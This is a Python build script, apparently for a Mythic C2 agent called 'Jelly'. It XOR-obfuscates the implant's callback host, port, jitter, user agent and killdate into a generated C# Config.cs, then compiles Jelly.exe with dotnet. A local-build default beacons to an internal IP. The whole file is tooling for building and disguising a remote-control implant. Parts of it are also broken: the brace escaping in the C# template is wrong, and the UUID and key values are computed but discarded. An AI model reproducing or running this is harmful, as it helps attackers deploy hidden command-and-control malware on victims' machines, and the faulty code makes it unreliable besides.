#!/usr/bin/env python3
"""
Mythic Jelly Payload Wrapper
Handles payload generation and post-build obfuscation
"""
import os
import sys
import subprocess
import base64
import shutil
from pathlib import Path

class JellyPayloadBuilder:
    def __init__(self, payload_type_path):
        self.base_path = payload_type_path
        self.agent_code_path = os.path.join(payload_type_path, "agent_code")
        self.jelly_project_path = os.path.join(self.agent_code_path, "Jelly")
        
    def obfuscate_string(self, text, xor_key=None):
        """Obfuscate a string using XOR with the same key used in Config.cs"""
        if xor_key is None:
            xor_key = bytes([0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12])
        
        text_bytes = text.encode('utf-8')
        obfuscated = bytearray()
        for i, byte in enumerate(text_bytes):
            obfuscated.append(byte ^ xor_key[i % len(xor_key)])
        
        return list(obfuscated)
    
    def generate_config_file(self, config_dict):
        """Generate the Config.cs file with obfuscated values"""
        config_content = '''#define C2PROFILE_NAME_UPPER

//#define LOCAL_BUILD

#if LOCAL_BUILD
//#define HTTP
//#define WEBSOCKET
//#define TCP
//#define SMB
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using Interop.Structs.Structs;
using PSKCryptography;
using Interop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Jelly
{
    public static class Config
    {
        // XOR key for string obfuscation
        private static readonly byte[] _xorKey = new byte[] {{ 0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12 }};

        private static string UnobfuscateString(byte[] obfuscatedBytes)
        {{
            byte[] result = new byte[obfuscatedBytes.Length];
            for (int i = 0; i < obfuscatedBytes.Length; i++)
            {{
                result[i] = (byte)(obfuscatedBytes[i] ^ _xorKey[i % _xorKey.Length]);
            }}
            return Encoding.UTF8.GetString(result);
        }}
'''
        
        # Add profile configurations
        config_content += '\n        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()\n        {\n'
        
        # HTTP Profile
        if 'http' in config_dict:
            http_config = config_dict['http']
            config_content += '''#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "callback_interval", "1" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://192.168.53.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
'''
            # Add obfuscated HTTP config
            for key, value in http_config.items():
                obfuscated = self.obfuscate_string(value)
                config_content += f'                        {{ "{key}", UnobfuscateString(new byte[] {{ {", ".join([str(b) for b in obfuscated])} }}) }},\n'
            
            config_content += '''#endif
                    }
                }
            },
#endif
'''
        
        config_content += '        };\n'
        config_content += '''
        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if LOCAL_BUILD
'''
        
        # Add obfuscated UUIDs
        if 'StagingRSAPrivateKey' in config_dict:
            obfuscated = self.obfuscate_string(config_dict['StagingRSAPrivateKey'])
            config_content += f'        public static string StagingRSAPrivateKey = "{chr(34)};\n'
        
        if 'PayloadUUID' in config_dict:
            obfuscated = self.obfuscate_string(config_dict['PayloadUUID'])
            config_content += f'        public static string PayloadUUID = "{chr(34)};\n'
        
        config_content += '''#else
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
'''
        
        return config_content
    
    def build_payload(self, parameters):
        """Build the Jelly payload with the given parameters"""
        try:
            # Extract parameters from the Mythic framework
            config_dict = {
                'http': {
                    'callback_host': parameters.get('callback_host', ''),
                    'callback_port': parameters.get('callback_port', ''),
                    'callback_interval': parameters.get('callback_interval', ''),
                    'callback_jitter': parameters.get('callback_jitter', ''),
                    'post_uri': parameters.get('post_uri', ''),
                    'encrypted_exchange_check': parameters.get('encrypted_exchange_check', ''),
                    'User-Agent': parameters.get('User-Agent', ''),
                    'killdate': parameters.get('killdate', ''),
                },
                'PayloadUUID': parameters.get('uuid', ''),
                'StagingRSAPrivateKey': parameters.get('StagingRSAPrivateKey', ''),
            }
            
            # Generate Config.cs with obfuscated values
            config_content = self.generate_config_file(config_dict)
            config_path = os.path.join(self.jelly_project_path, 'Config.cs')
            
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(config_content)
            
            print(f"[+] Generated obfuscated Config.cs")
            
            # Build the project
            project_file = os.path.join(self.jelly_project_path, 'Jelly.csproj')
            build_cmd = f'dotnet build "{project_file}" -c Release'
            
            result = subprocess.run(build_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[-] Build failed: {result.stderr}")
                return None
            
            # Find the built executable
            exe_path = os.path.join(self.jelly_project_path, 'bin', 'Release', 'net451', 'Jelly.exe')
            
            if os.path.exists(exe_path):
                print(f"[+] Payload built successfully: {exe_path}")
                return exe_path
            else:
                print(f"[-] Executable not found at {exe_path}")
                return None
                
        except Exception as e:
            print(f"[-] Error building payload: {str(e)}")
            return None

# Main entry point for Mythic
def main():
    if len(sys.argv) < 2:
        print("Usage: wrapper.py <payload_type_path> [parameters_json]")
        sys.exit(1)
    
    payload_type_path = sys.argv[1]
    builder = JellyPayloadBuilder(payload_type_path)
    
    # When called from Mythic, parameters will be passed in
    # For now, this is a template
    print("[+] Jelly Payload Wrapper Initialized")

if __name__ == "__main__":
    main()
